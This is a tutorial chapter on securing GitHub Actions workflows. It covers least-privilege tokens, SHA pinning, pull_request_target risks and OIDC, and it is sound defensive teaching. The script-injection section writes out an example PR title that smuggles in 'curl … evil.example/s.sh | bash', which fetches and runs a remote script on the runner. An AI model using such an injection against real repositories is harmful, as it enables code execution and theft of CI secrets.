# 37 · Security Hardening for GitHub Actions

> **Part G: Security and production** · Previous: [36 · OIDC](36-oidc-cloud-authentication.md) · Next: [38 · Self-hosted runners deep dive](38-self-hosted-runners-deep-dive.md) · [Back to INDEX](INDEX.md)
>
> This topic gathers the security warnings from earlier topics (secrets, tokens, self-hosted risk, pinning, the capstone's "default branch" guardrail) into one checklist, and adds the big attack classes interviewers ask about.

---

## What it is

A CI/CD system has **write access to your code, your secrets and your production cloud**. That makes it a prime target. Hardening means closing the common ways attackers abuse workflows:

| # | Risk | One-line defence |
|---|---|---|
| 1 | Over-privileged `GITHUB_TOKEN` | `permissions: contents: read` by default (topic 18) |
| 2 | Compromised or moved third-party action tags | **Pin full commit SHAs**, plus Dependabot |
| 3 | **Script injection** from untrusted text | Pass `${{ github.event.* }}` through `env:`, never inline in `run:` |
| 4 | **`pull_request_target` / "pwn request"** | Never check out and run PR code there |
| 5 | Secrets in logs or artifacts | Mask, don't print, short retention |
| 6 | Long-lived cloud keys | OIDC (topic 36) |
| 7 | Self-hosted runners on public repos | Don't. Use ephemeral, isolated runners |
| 8 | Unreviewed workflow changes | CODEOWNERS on `.github/workflows/` + rulesets (topic 30) |
| 9 | Unprotected production | Environments with reviewers and branch rules (topic 28) |
| 10 | Unknown dependencies and actions | Allowed-actions policy, Dependabot, secret scanning |

---

## Why it exists

Real incidents:

- **March 2026, `aquasecurity/trivy-action`:** attackers used a stolen credential to **force-push 75+ version tags** to malicious code that searched runners for secrets. Anyone using `@v0.x` tags ran it during roughly a 12-hour window. **SHA-pinned users were safe.** (Two incidents in a row: the first clean-up missed a credential.)
- **March 2025, `tj-actions/changed-files`:** the same pattern. Retagged versions dumped runner memory (including secrets) into **public** workflow logs of ~23,000 repos.
- **"Pwn requests":** many open-source repos leaked secrets because a `pull_request_target` workflow checked out and built attacker-controlled fork code.

**Jenkins comparison:** the Jenkins equivalents are unsandboxed Groovy, plugin supply-chain attacks and credentials scoped too widely. The defences are similar: least privilege, pinned versions, review of pipeline changes.

---

## Analogy

Your CI system is a **bank's armoured van service**:

- Give each driver only the keys for **their route** (least-privilege token).
- Buy van parts from suppliers **by serial number**, not "whatever the latest model is" (SHA pinning).
- Never let a **customer's note** be read aloud as an instruction to the driver (script injection).
- Don't let **strangers' parcels** be opened inside the vault (`pull_request_target` with PR code).
- Don't let the public **borrow your van** (self-hosted runners on public repos).

---

## How it works inside

### Script injection

```yaml
# ❌ VULNERABLE
- run: echo "Checking PR title: ${{ github.event.pull_request.title }}"
```

GitHub substitutes `${{ }}` **into the script text before Bash runs it** (topic 11). An attacker opens a PR titled:

```text
x"; curl -s https://evil.example/s.sh | bash; echo "
```

The generated script becomes:

```bash
echo "Checking PR title: x"; curl -s https://evil.example/s.sh | bash; echo ""
```

and runs **their** code on your runner, with your token and any secrets in that job.

```yaml
# ✅ SAFE: the value travels as data in an environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking PR title: $TITLE"
```

Untrusted inputs include: PR **title** and **body**, **branch names** (`head_ref`), **commit messages**, issue and comment **bodies**, review text, label names, and any `client_payload`.

### `pull_request` vs `pull_request_target`

| | `pull_request` (from a fork) | `pull_request_target` |
|---|---|---|
| Workflow file used | from the **PR (fork)** | from the **base branch** (trusted) |
| Code checked out by default | PR merge commit | **base** branch |
| Secrets | ❌ not available | ✅ **available** |
| `GITHUB_TOKEN` | read-only | **read/write** |
| Safe to build/test PR code? | ✅ yes | ❌ **NO**: that's the "pwn request" |

`pull_request_target` exists for things like **labelling or commenting** on fork PRs **without running their code**. The moment you add `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` and then `npm install` or `make`, the attacker's code runs with your secrets.

> 🆕 **New in 2026: `actions/checkout@v7` refuses this by default.** Starting with v7 (June 2026), checkout **won't fetch fork PR code** inside `pull_request_target` and `workflow_run` workflows unless you explicitly opt in ([GitHub changelog](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/)). That's a safety net, not a fix. If you upgrade from v4–v6 and an old "pwn request" style workflow suddenly fails at checkout, the right response is to **redesign it** with the pattern below, not to opt back in.

Safe pattern for "test untrusted code, then comment": run tests in `pull_request` (no secrets), upload results as an artifact, then a `workflow_run` workflow (trusted, topic 31) downloads the **data** (never executes it) and comments.

### Why the capstone's "default branch requirement" is a guardrail

`workflow_run`, `schedule`, `repository_dispatch` and `pull_request_target` all run the definition **from the default branch**, because they carry privileges. A feature branch can't introduce a new privileged listener without going through PR review into `main`.

---

## Workflow YAML / commands

### A hardened workflow skeleton

```yaml
name: Hardened CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                          # 1. least privilege by default

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-26.04                 # pinned image (topic 07)
    timeout-minutes: 15                   # no 6-hour hangs (topic 14)
    steps:
      - uses: actions/checkout@<40-char-sha>        # v7.x.x   2. SHA-pinned
        with:
          persist-credentials: false                # don't leave the token in .git/config

      - uses: actions/setup-node@<40-char-sha>      # v6.x.x
        with:
          node-version: 24
          cache: npm

      - name: Use untrusted text safely             # 3. no inline ${{ }} of untrusted data
        env:
          BRANCH: ${{ github.head_ref }}
        run: echo "Testing branch $BRANCH"

      - run: npm ci && npm test

  deploy:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: test
    runs-on: ubuntu-26.04
    environment: prod                     # 9. reviewers + branch rules
    permissions:
      contents: read
      id-token: write                     # 6. OIDC, no stored cloud keys
    steps:
      - uses: aws-actions/configure-aws-credentials@<40-char-sha>   # v6.x.x
        with:
          role-to-assume: ${{ vars.PROD_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: ./deploy.sh
```

(`<40-char-sha>` = the release's full commit SHA from its GitHub Releases page. Keep the `# vX.Y.Z` comment so humans and Dependabot know the version.)

### Repository and organization settings

| Setting | Where | Recommended |
|---|---|---|
| Default `GITHUB_TOKEN` permissions | Settings → Actions → General → Workflow permissions | **Read repository contents** |
| Allow Actions to create/approve PRs | same page | Off, unless needed (the capstone needs it) |
| Allowed actions | Settings → Actions → General → Actions permissions | "Allow selected actions": GitHub-owned + verified creators + an explicit list. Org-level option: **require SHA pinning** |
| Fork PR workflows | Settings → Actions → General → Fork pull request workflows | Require approval for **all outside contributors** |
| Secret scanning + push protection | Settings → Code security | On (blocks commits that contain tokens) |
| Dependabot alerts and version updates | `.github/dependabot.yml` with `github-actions` ecosystem (topic 35) | On |
| Rulesets + CODEOWNERS for `/.github/workflows/` | topic 30 | On |

### Finding problems automatically

```bash
# actionlint: catches YAML/expression errors AND some injection patterns (topic 39)
actionlint .github/workflows/*.yml

# zizmor: a security-focused static analyser for GitHub Actions workflows
pipx run zizmor .github/workflows/
```

**Sample `zizmor` output:**

```text
error[template-injection]: code injection via template expansion
  --> .github/workflows/ci.yml:18:14
   |
18 |       - run: echo "Checking PR title: ${{ github.event.pull_request.title }}"
   |              ^^^ may expand into attacker-controllable code
warning[unpinned-uses]: unpinned action reference
  --> .github/workflows/ci.yml:9:15
   |
 9 |       - uses: aquasecurity/trivy-action@v0.36.0
```

OpenSSF **Scorecard** (`ossf/scorecard-action`) also grades a repo on pinning, token permissions, branch protection, and more.

---

## Hands-on lab

1. In a **throwaway** repo, add the vulnerable `echo "${{ github.event.pull_request.title }}"` step. Open a PR titled ``x"; echo INJECTED; echo "`` and see `INJECTED` in the log. Then fix it with `env:`.
2. Set workflow-level `permissions: contents: read` and confirm a step that comments on a PR now fails with 403. Grant `pull-requests: write` only to that job.
3. Pin every `uses:` in your practice repo to SHAs, add `dependabot.yml`, and wait for an update PR.
4. Run `zizmor` (or `actionlint`) on all your workflows and fix the findings.
5. Read the [GitHub security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) and tick off the table above for your repo.

---

## Where you'll use it

- **Security reviews and audits** of pipelines (SOC 2, ISO 27001 evidence).
- **Open-source maintenance:** fork PRs are hostile by default.
- **Incident response:** "were we affected by the trivy-action or tj-actions compromise?" Check logs for the affected window and rotate any reachable secrets.
- **Interviews:** "how would you secure a GitHub Actions pipeline?" Walk through the 10-row table.

---

## When it breaks

| Symptom | Meaning | Fix |
|---|---|---|
| A strange command ran in your logs | Script injection. | Move untrusted values to `env:`. Rotate exposed secrets. |
| Secrets in public logs after an action update | Compromised or retagged action. | Pin SHAs. Rotate secrets. Check the window of exposure. |
| Fork PR builds can read secrets | `pull_request_target` + PR checkout. | Use `pull_request` for builds, `workflow_run` for privileged follow-ups. |
| `The action … is not allowed in …` after tightening the policy | Allowed-actions list. | Add the reviewed action (by SHA) to the allow list. |
| Workflow modified in a PR to dump secrets | Missing review of workflow changes. | CODEOWNERS + rulesets. Environment secrets only for protected environments. |

---

## Quick recap

- Least-privilege `permissions:` everywhere. OIDC instead of cloud keys.
- **Pin third-party actions to full SHAs.** Dependabot keeps them fresh.
- **Never inline untrusted `${{ github.event.* }}` in `run:`.** Use `env:`.
- `pull_request_target` + checking out PR code = secret theft. Don't.
- Protect workflows (CODEOWNERS, rulesets) and production (environments). No self-hosted runners on public repos.

**Interview questions**

1. **Q: What is script injection in GitHub Actions and how do you prevent it?**
   A: Untrusted text (a PR title or branch name) inserted with `${{ }}` into a `run:` script becomes code. Pass it via `env:` and quote `"$VAR"`.
2. **Q: Why is `pull_request_target` dangerous?**
   A: It runs with secrets and a write token. If it checks out and executes the PR's code, a fork author can steal secrets.
3. **Q: What lesson does the 2026 trivy-action compromise teach?**
   A: Version tags are mutable. Pin third-party actions to full commit SHAs, and use immutable releases for your own actions.
